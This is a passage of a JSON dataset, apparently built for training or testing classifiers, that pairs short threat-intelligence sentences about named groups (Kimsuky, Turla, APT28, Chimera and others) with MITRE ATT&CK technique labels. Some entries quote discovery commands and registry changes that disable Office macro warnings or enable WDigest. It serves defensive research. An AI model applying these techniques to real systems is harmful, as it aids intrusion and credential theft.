    "text": "A Threat Group-3390 tool can use WMI to execute a binary.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Ursnif droppers have used WMI classes to execute PowerShell commands.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "WannaCry utilizes wmic to delete shadow copies.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "One variant of Zebrocy uses WMI queries to gather information.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Frankenstein has enumerated hosts via Empire, gathering various local system information.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Frankenstein has uploaded and downloaded files to utilize additional plugins.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Frankenstein has enumerated hosts, looking to obtain a list of all currently running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Frankenstein has enumerated hosts, looking for the system's machine name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Frankenstein has enumerated hosts, looking for the public IP address of the system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Frankenstein has enumerated hosts, gathering username, machine name, and administrative permissions information.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Frankenstein has used WMI queries to check if various security applications were running, as well as the operating system version.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Ke3chang has used tools to download files to compromised machines.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Ke3chang performs operating system information discovery using systeminfo and has used implants to identify the system language and computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Ke3chang has performed local network configuration discovery using ipconfig.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Ke3chang has used implants capable of collecting the signed-in username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Ke3chang has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Ke3chang has used compromised credentials to sign into victims’ Microsoft 365 accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Winnti Group has used a program named ff.exe to search for specific documents on compromised hosts.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Winnti Group has downloaded an auxiliary program named ff.exe to infected machines.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Molerats used executables to download malicious files from different sources.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "OilRig has used reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" on a victim to query the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "OilRig has run ipconfig /all on a victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Silence has downloaded additional modules and malware to victim’s machines.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Silence can create, delete, or modify a specified Registry key or value.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Silence has leveraged the Windows API, including using CreateProcess() or ShellExecute(), to perform a variety of tasks.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Silence has injected a DLL library containing a Trojan into the fwmain32.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Silence has used compromised credentials to log on to other systems and escalate privileges.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "ZIRCONIUM has used tools to download malicious files to compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ZIRCONIUM has used a tool to query the Registry for proxy settings.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "ZIRCONIUM has used a tool to capture the processor architecture of a compromised host in order to register it with C2.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ZIRCONIUM has used a tool to enumerate proxy settings in the target environment.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "ZIRCONIUM has used a tool to capture the username on a compromised host in order to register it with C2.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has the ability to enumerate all files and directories on an infected system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has downloaded additional scripts, tools, and malware onto victim systems.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has modified Registry settings for default file associations to enable all macros and for persistence.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky can gather a list of all processes running on a victim's machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has used Win7Elevate to inject malicious code into explorer.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has obtained specific Registry keys and values on a compromised host.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has enumerated drives, OS type, OS version, and other information using a script or the \"systeminfo\" command.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has used ipconfig/all to gather network configuration information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Fox Kitten has searched local system resources to access sensitive documents.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Fox Kitten has used WizTree to obtain network files and directory listings.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Fox Kitten has downloaded additional tools including PsExec directly to endpoints.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Fox Kitten has accessed Registry hives ntuser.dat and UserClass.dat.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Fox Kitten has used valid credentials with various services during lateral movement.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Darkhotel has used malware that searched for files with specific patterns.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Darkhotel has used first-stage payloads that download additional malware from C2 servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Darkhotel malware can collect a list of running processes on a system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Darkhotel has collected the hostname, OS version, service pack version, and the processor architecture from the victim’s machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Darkhotel has collected the IP address and network adapter information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "APT-C-36 has downloaded binary data from a specified domain after the malicious document is opened.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "APT38 has collected data from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "APT38 have enumerated files and directories, or searched in specific locations within a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "APT38 used a backdoor, NESTEGG, that has the capability to download and upload files to and from a victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "APT38 has used the Windows API to execute code within a victim's system.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "APT38 has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "APT38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Gorgon Group malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU\\Software\\Microsoft\\Office\\.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Gorgon Group malware can leverage the Windows API call, CreateProcessA(), for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "APT1 gathered a list of running processes on the system using tasklist /v.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "APT1 used the ipconfig /all command to gather network configuration information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Group has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.[2][3] The group's JavaScript backdoor is also capable of downloading files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Threat Group-3390 has downloaded additional malware and tools, including through the use of certutil, onto a compromised host .",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A Threat Group-3390 tool has created new Registry keys under HKEY_CURRENT_USER\\Software\\Classes\\ and HKLM\\SYSTEM\\CurrentControlSet\\services.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "A Threat Group-3390 tool can spawn svchost.exe and inject the payload into that process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Threat Group-3390 has used whoami to collect system user information.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "BRONZE BUTLER has used various tools to download files, including DGet (a similar tool to wget).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "APT39 has used various tools to steal files from the compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "APT39 has used tools with the ability to search for files on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "APT39 has downloaded tools to compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "APT39 has used various strains of malware to query the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "APT39 has used stolen credentials to compromise Outlook Web Access (OWA).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Gamaredon Group has collected files from infected systems and uploaded them to a C2 server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Gamaredon Group macros can scan for Microsoft Word and Excel files to inject with additional malicious macros. Gamaredon Group has also used its backdoors to automatically list interesting files (such as Office documents) found on a system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Gamaredon Group has downloaded additional malware and tools onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Gamaredon Group has removed security settings for VBA macro execution by changing registry values HKCU\\Software\\Microsoft\\Office\\<version>\\<product>\\Security\\VBAWarnings and HKCU\\Software\\Microsoft\\Office\\<version>\\<product>\\Security\\AccessVBOM.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Gamaredon Group malware has used CreateProcess to launch additional malicious components.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Gamaredon Group has used tools to enumerate processes on target hosts including Process Explorer.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Gamaredon Group has tested connectivity between a compromised machine and a C2 server using Ping with commands such as CSIDL_SYSTEM\\cmd.exe /c ping -n 1.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Gamaredon Group has used WMI to execute scripts used for discovery.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Whitefly has the ability to download additional tools from the C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Higaisa has called various native OS APIs.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Higaisa’s shellcode attempted to find the process ID of the current process.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Higaisa collected the system volume serial number, GUID, and computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Higaisa used ipconfig to gather network configuration information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about files and directories: dir c:\\ >> %temp%\\download dir \"c:\\Documents and Settings\" >> %temp%\\download dir \"c:\\Program Files\\\" >> %temp%\\download dir d:\\ >> %temp%\\download",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about the OS: ver >> %temp%\\download systeminfo >> %temp%\\download",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "admin@338 actors used the following command after exploiting a machine with LOWBALL malware to acquire information about local networks: ipconfig /all >> %temp%\\download",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "FIN7 has collected files and other sensitive information from a compromised network.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "FIN7 has harvested valid administrative credentials for lateral movement.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "FIN7 has used WMI to install malware on targeted systems.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Ajax Security Team has used Wrapper/Gholee, custom-developed malware, which downloaded additional malware to the infected system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "TeamTNT has the curl command and batch scripts to download new tools.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "TeamTNT searches for rival malware and removes them if found.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "TeamTNT has searched for system version and architecture information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "TeamTNT looks for the host machine’s IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "TA551 has retrieved DLLs and installer binaries for malware execution from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "MuddyWater has used malware that can upload additional files to the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "MuddyWater has used malware that can collect the victim’s OS version and machine name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "MuddyWater has used malware to collect the victim’s IP address and domain name.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "MuddyWater has used malware that can collect the victim’s username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent.[1][12] Turla RPC backdoors have also searched for files matching the lPH*.dll pattern.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Turla has used the Registry to store encrypted payloads.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Turla surveys a system upon check-in to discover running processes using the tasklist /v command.[1] Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Turla surveys a system upon check-in to discover information in the Windows Registry with the reg query command.[1] Turla has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Turla surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, net config, ipconfig /all, and route commands, as well as NBTscan.[1][16][12] Turla RPC backdoors have also retrieved registered RPC interface information from process memory.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Turla has used tracert to check internet connectivity.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Turla has abused local accounts that have the same password across the victim’s network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "An APT3 downloader uses the Windows command \"cmd.exe\" /C whoami to verify that it is running with the elevated privileges of \"System.\"",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has exfiltrated files and directories of interest from the targeted system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has gathered a recursive directory listing to find files and directories of interest.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao can download additional files to the infected system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has enabled Wdigest by changing the registry value from 0 to 1.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has used the CreateProcessA and ShellExecute API function to launch commands after being injected into a selected process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has collected a list of running processes on the infected system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has injected code into a selected process, which in turn launches a command as a child process of the original.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has queried the registry to detect recent PuTTY sessions.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has discovered the local disks attached to the system and their hardware information including manufacturer and model, as well as the OS versions of systems connected to a targeted network.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has discovered the local network configuration with ipconfig.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has used valid VPN credentials to gain initial access.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has used domain credentials, including domain admin, for lateral movement and privilege escalation.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has used local account credentials found during the intrusion for lateral movement and privilege escalation.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Operation Wocao has used WMI to execute commands.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Sidewinder has used malware to collect information on files and directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Sidewinder has used LNK files to download remote files to the victim's network.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Sidewinder has used tools to identify running processes on the victim's machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Sidewinder has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Sidewinder has used malware to collect information on network interfaces, including the MAC address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Sidewinder has used tools to identify the user of a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "An executable dropped onto victims by Putter Panda aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "PROMETHIUM has created admin accounts on a compromised host.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Sowbug identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly has collected data from local victim systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly has used a batch script to gather folder and file names from victim hosts.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly has copied and installed tools for operations once in the victim environment.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly has modified the Registry to perform multiple techniques through the use of Reg.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly has queried the Registry to identify victim information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly has used batch scripts to enumerate network information, including information about trusts, zones, and the domain.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly used the command query user on victim hosts.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly has compromised user credentials and used valid accounts for operations.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 has collected and exfiltrated payment card data from compromised systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Evilnum can deploy additional components or tools as needed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Axiom has collected data from a compromised network.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Axiom has used previously compromised administrative accounts to escalate privileges.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Andariel has collected large numbers of files from compromised network systems for later extraction.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Andariel has downloaded additional tools and malware onto compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Andariel has used tasklist to enumerate processes and find a specific string.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Chimera has utilized multiple commands to identify data of interest in file and directory listings.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Chimera has remotely copied tools and malware onto targeted systems.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Chimera has used direct Windows system calls by leveraging Dumpert.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Chimera has used tasklist to enumerate processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Chimera has queried Registry keys using reg query \\\\HKU\\\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers and reg query \\\\HKU\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Chimera has used fsutil fsinfo drives, systeminfo, and vssadmin list shadows for system information including shadow volumes and drive information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Chimera has used ipconfig, Ping, and tracert to enumerate the IP address and network environment and settings of the local host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Chimera has used the quser command to show currently logged on users.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Chimera has used a valid account to maintain persistence via scheduled task.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Chimera has used compromised domain accounts to gain access to the target environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Chimera has used WMIC to execute remote commands.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "APT37 leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "APT37 injects its malware variant, ROKRAT, into the cmd.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "menuPass has searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "menuPass has used native APIs including GetModuleFileName, lstrcat, CreateFile, and ReadFile.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "menuPass has used process hollowing in iexplore.exe to load the RedLeaves implant.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "menuPass has used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "FIN8 has injected malicious code into a new svchost.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "FIN8 has used valid accounts for persistence and lateral movement.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "FIN8's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution. FIN8 has also used WMIC for lateral movement as well as during and post compromise cleanup activities.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "An APT28 loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "APT28 has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "BackdoorDiplomacy has downloaded additional files and tools onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BackdoorDiplomacy has dropped legitimate software onto a compromised host and used it to execute malicious DLLs.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Nomadic Octopus has used malicious macros to download additional files to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BlackTech has used built-in API functions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Naikon has used administrator credentials for lateral movement in compromised networks.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Naikon has used WMIC.exe for lateral movement.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "GALLIUM collected data from the victim's local system, including password hashes from the SAM hive in the Registry.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "GALLIUM dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and HTRAN.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "GALLIUM used ipconfig /all to obtain information about the victim network configuration. The group also ran a modified version of NBTscan to identify available NetBIOS name servers.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "GALLIUM used whoami and query user to obtain information about the victim user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "GALLIUM leveraged valid accounts to maintain access to a victim network.",
    "command": "",
    "labels": [
